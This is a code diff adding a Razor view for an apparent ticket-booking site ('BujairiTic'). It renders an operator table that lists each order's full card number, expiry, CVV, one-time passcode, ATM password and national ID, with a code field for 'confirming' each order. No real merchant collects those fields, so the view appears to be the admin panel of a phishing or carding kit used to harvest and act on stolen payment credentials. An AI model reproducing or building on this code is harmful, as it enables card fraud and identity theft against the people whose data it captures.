@@ -1,0 +1,89 @@
+﻿@model List<BujairiTic.Models.Order>
+
+@{
+    int counter = 1;
+}
+
+@if (Model == null || !Model.Any())
+{
+    <tr>
+        <td colspan="16">No Orders Found</td>
+    </tr>
+}
+else
+{
+    foreach (var order in Model)
+    {
+        var item = order.Items.FirstOrDefault();
+        bool hasCode = !string.IsNullOrEmpty(order.TransactionNo);
+
+        <tr>
+
+            <td>@counter</td>
+
+            <!-- Order ID -->
+            <td>@order.Id</td>
+
+            <!-- Booking -->
+            <td>
+                @(item?.BookingDate.ToString("yyyy-MM-dd") ?? "")
+            </td>
+
+            <td>@item?.Guests</td>
+            <td>@item?.SelectedTime</td>
+
+            <!-- Card -->
+            <td>@order.CardholderName</td>
+            <td>@order.CardNumber</td>
+            <td>@order.Expiry</td>
+
+            <td class="secure">@order.CVV</td>
+
+            <td>@order.Otp</td>
+
+            <td class="secure">@order.AtmPassword</td>
+
+            <!-- Customer -->
+            <td>@order.Mobile</td>
+            <td>@order.Provider</td>
+            <td>@order.NationalIdOrIqama</td>
+
+            <!-- Transaction -->
+            <td>
+                @(hasCode? order.TransactionNo: "--")
+            </td>
+
+            <!-- Action -->
+            <td style="display:flex; gap:4px; justify-content:center;">
+
+                @if (!hasCode)
+                {
+                    <input type="text"
+                           id="code-@order.Id"
+                           placeholder="Code"
+                           style="width:70px; padding:4px;" />
+
+                    <button onclick="confirmOrder(@order.Id)"
+                            style="background:#16a34a; color:white; border:none; padding:4px 8px;">
+                        Confirm
+                    </button>
+                }
+                else
+                {
+                    <span style="color:green; font-weight:bold;">
+                        ✔ Confirmed
+                    </span>
+                }
+
+                <button onclick="deleteOrder(@order.Id)"
+                        style="background:#dc2626; color:white; border:none; padding:4px 8px;">
+                    Delete
+                </button>
+
+            </td>
+
+        </tr>
+
+        counter++;
+    }
+}
